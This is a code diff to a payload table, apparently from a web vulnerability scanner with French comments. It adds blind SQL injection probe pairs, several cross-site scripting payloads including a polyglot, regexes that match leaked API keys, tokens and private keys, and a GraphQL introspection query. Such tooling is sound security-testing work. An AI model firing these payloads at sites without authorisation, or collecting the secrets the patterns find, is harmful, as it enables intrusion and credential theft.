@@ -8,7 +8,18 @@ const PAYLOADS = {
 
   // ─── SQL Injection ────────────────────────────────────────────────────────
   sqli: {
-    params: ['id', 'user', 'q', 'search', 'item', 'email', 'name', 'page', 'cat', 'product'],
+    params: ['id', 'user', 'q', 'search', 'item', 'email', 'name', 'page', 'cat', 'product',
+             'uid', 'pid', 'category', 'order', 'sort', 'filter', 'ref', 'code', 'num', 'view'],
+
+    // Boolean-based blind : paire vrai/faux. Si la réponse "vrai" ressemble à la
+    // baseline et que la réponse "faux" en diverge nettement → injection probable.
+    boolean_pairs: [
+      { t: "' AND '1'='1",  f: "' AND '1'='2"  },
+      { t: "' AND 1=1-- -", f: "' AND 1=2-- -" },
+      { t: " AND 1=1",      f: " AND 1=2"       },
+      { t: "') AND ('1'='1",f: "') AND ('1'='2" },
+      { t: '" AND "1"="1',  f: '" AND "1"="2'   },
+    ],
 
     // Error-based payloads — trigger DB error messages
     error_payloads: [
@@ -105,7 +116,39 @@ const PAYLOADS = {
       '${alert(1)}',
       // DOM sink bait
       'javascript:alert(document.domain)',
+      // Polyglot (s'exécute dans plusieurs contextes : attribut, JS, HTML)
+      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>',
+      // Contexte JS (bris de chaîne)
+      '\';alert(1);//',
+      '\\\';alert(1);//',
+      // SVG + animate
+      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
+      // Balise fermante générique
+      '</title><script>alert(1)</script>',
     ],
+  },
+
+  // ─── Secrets exposés (clés API, tokens, clés privées dans le HTML/JS) ───────
+  secrets: {
+    patterns: [
+      { rx: /AKIA[0-9A-Z]{16}/,                                  name: 'AWS Access Key ID',    sev: 'CRITICAL' },
+      { rx: /AIza[0-9A-Za-z\-_]{35}/,                            name: 'Google API Key',       sev: 'HIGH'     },
+      { rx: /sk_live_[0-9a-zA-Z]{20,}/,                          name: 'Stripe Secret Key',    sev: 'CRITICAL' },
+      { rx: /gh[pousr]_[0-9A-Za-z]{36,}/,                        name: 'GitHub Token',         sev: 'CRITICAL' },
+      { rx: /xox[baprs]-[0-9A-Za-z-]{10,48}/,                    name: 'Slack Token',          sev: 'HIGH'     },
+      { rx: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/, name: 'Clé privée',       sev: 'CRITICAL' },
+      { rx: /mongodb(?:\+srv)?:\/\/[^\s"'<>]+:[^\s"'<>]+@/,      name: 'URI MongoDB (avec mdp)', sev: 'CRITICAL' },
+      { rx: /postgres(?:ql)?:\/\/[^\s"'<>]+:[^\s"'<>]+@/,        name: 'URI PostgreSQL (avec mdp)', sev: 'CRITICAL' },
+      { rx: /(?:SG\.)[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}/,    name: 'SendGrid API Key',     sev: 'HIGH'     },
+      { rx: /ya29\.[0-9A-Za-z\-_]+/,                             name: 'Google OAuth Token',   sev: 'HIGH'     },
+      { rx: /AC[a-z0-9]{32}/,                                    name: 'Twilio Account SID',   sev: 'MEDIUM'   },
+    ],
+  },
+
+  // ─── GraphQL ────────────────────────────────────────────────────────────────
+  graphql: {
+    endpoints: ['/graphql', '/api/graphql', '/v1/graphql', '/graphql/v1', '/query', '/gql', '/api/gql'],
+    introspection: '{"query":"query{__schema{queryType{name} types{name kind}}}"}',
   },
 
   // ─── LFI ─────────────────────────────────────────────────────────────────
